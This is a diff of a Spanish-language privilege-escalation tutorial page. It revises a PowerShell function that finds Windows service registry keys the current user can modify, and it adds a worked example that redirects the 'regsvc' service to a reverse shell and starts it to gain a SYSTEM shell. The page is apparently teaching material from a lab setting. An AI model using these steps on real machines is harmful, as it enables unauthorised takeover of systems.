@@ -19,10 +19,9 @@
         contenido.
     </span>
 </p>
-
 <!-- Code snipet-->
 <div class="snipet_custom position-relative">
-<pre class="code_snipet code_powershell"><code data-language="shell">function ModifiablePath {param ([Parameter(Mandatory = $true)][String[]]$Paths);$Sids = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-Object -ExpandProperty Value;$Sids += $UserIdentity.User.Value;ForEach($Path in $Paths){if (-Not(Test-Path -Path $Path -ErrorAction SilentlyContinue)){$Path=Split-Path -Path $Path -Parent};if (Test-Path -Path $Path -ErrorAction SilentlyContinue) {$FILE=Resolve-Path -Path $Path | Select-Object -ExpandProperty Path;Get-Acl -Path $Path | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {if($_.FileSystemRights){$Rights = $_.FileSystemRights.value__}else{$Rights = $_.RegistryRights.value__};if(@([uint32]'0x40000000',[uint32]'0x10000000',[uint32]'0x02000000',[uint32]'0x00080000',[uint32]'0x00040000',[uint32]'0x00000004',[uint32]'0x00000002') | Where-Object { $Rights -band $_ }){if ($Sids -contains $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExcludeProperty Value) {$Path}}}}}}
+<pre class="code_snipet code_powershell"><code data-language="shell">function ModifiablePath {param ([Parameter(Mandatory = $true)][String[]]$Paths);$Sids = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-Object -ExpandProperty Value;$Sids += $UserIdentity.User.Value;ForEach($Path in $Paths){try{$Path=$Path.Replace('"', "");if (-Not(Test-Path -Path $Path -ErrorAction Stop)){$Path=Split-Path -Path $Path -Parent};if (Test-Path -Path $Path -ErrorAction Stop) {$FILE=Resolve-Path -Path $Path | Select-Object -ExpandProperty Path;Get-Acl -Path $Path | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {if($_.FileSystemRights){$Rights = $_.FileSystemRights.value__}else{$Rights = $_.RegistryRights.value__};if(@([uint32]'0x40000000',[uint32]'0x10000000',[uint32]'0x02000000',[uint32]'0x00080000',[uint32]'0x00040000',[uint32]'0x00000004',[uint32]'0x00000002') | Where-Object { $Rights -band $_ }){if ($Sids -contains $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExcludeProperty Value) {$Path}}}}}catch{$false}}}
 </code></pre>
 </div>
 <!-- Code-->
@@ -36,7 +35,7 @@
 
 <!-- Code snipet-->
 <div class="snipet_custom position-relative">
-<pre class="code_snipet code_powershell"><code data-language="shell">ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { ModifiablePath $_.PSPath}
+<pre class="code_snipet code_powershell"><code data-language="shell">ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { if(ModifiablePath $_.PSPath){$_.PSPath}}
 </code></pre>
 </div>
 <!-- Code-->
@@ -72,3 +71,40 @@ net stop [Service_Name] && net start [Service_Name]
 </code></pre>
 </div>
 <!-- Code-->
+
+
+
+<!-- 
+    ---------------------------- EJEMPLO ------------------------------------------------
+-->
+
+<h2 class="h_ejemplo"><i class="bi bi-bug-fill me-2"></i></i>EJEMPLO</h2>
+<p>
+    <b>Inicialmente, copiamos y pegamos para cargar la función auxiliar</b>.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/services/regPerm_1.png" />
+<p>
+    A continuación utilizamos el pequeño script que listará todos los registros de los servicios y comprobará si el usuario actual puede modificarlos.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/services/regPerm_2.png" />
+<p>
+    Esto nos muestra un servicio llamado <b>regsvc</b> con permisos débiles en el registro. Vamos entonces a consultar dicho registro 
+    para ver su configuración.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/services/regPerm_3.png" />
+<p>
+    A continuación, crearemos una shell reversa y manipularemos el registro para que la ruta al ejecutable apunte a nuestra shell reversa.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/services/regPerm_4.png" />
+<p>
+    Finalmente ejecutamos de forma manual el servicio con el comando siguiente.
+</p>
+<!-- Code snipet-->
+<pre class="code_snipet"><code data-language="shell">net start regsvc
+</code></pre>
+</div>
+<!-- Code-->
+<p>
+    Y a los pocos segundos obtenemos una conexión con la shell reversa ejecutada como SYSTEM.
+</p>
+<img class="img img-fluid imag_ejemplos mb-3" src="./media/imag/services/regPerm_5.png" />
